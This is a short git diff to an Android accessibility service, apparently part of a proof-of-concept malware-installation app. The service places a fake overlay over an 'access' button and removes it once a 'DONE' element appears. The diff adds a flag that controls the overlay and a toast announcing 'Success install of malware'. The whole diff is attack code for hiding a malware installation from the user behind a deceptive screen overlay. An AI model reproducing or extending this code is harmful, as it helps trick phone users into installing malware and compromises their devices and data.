@@ -14,6 +14,9 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.FrameLayout;
 import android.widget.ImageView;
 import android.widget.TextView;
+import android.widget.Toast;
+
+import com.andrei.host.presentation.ui.MalwareInstallationActivity;
 
 public class ClickerService extends AccessibilityService /*implements ServiceConnection*/ {
 
@@ -100,7 +103,9 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
             nodeInfo.refresh();
             if (nodeInfo.getViewIdResourceName() != null &&
                     nodeInfo.getViewIdResourceName().equals(getPackageName() + ":id/btn_access")) {
-                createFakeOverlay();
+                if (MalwareInstallationActivity.showOverlay) {
+                    createFakeOverlay();
+                }
             } else if (nodeInfo.getText() != null &&
                     nodeInfo.getText().toString().equalsIgnoreCase("DONE")) {
 
@@ -108,6 +113,8 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
+                        Toast.makeText(getApplicationContext(), "Success install of malware", Toast.LENGTH_SHORT).show();
+                        MalwareInstallationActivity.showOverlay = false;
                         removeFakeOverlay();
                     }
                 }, 1000);
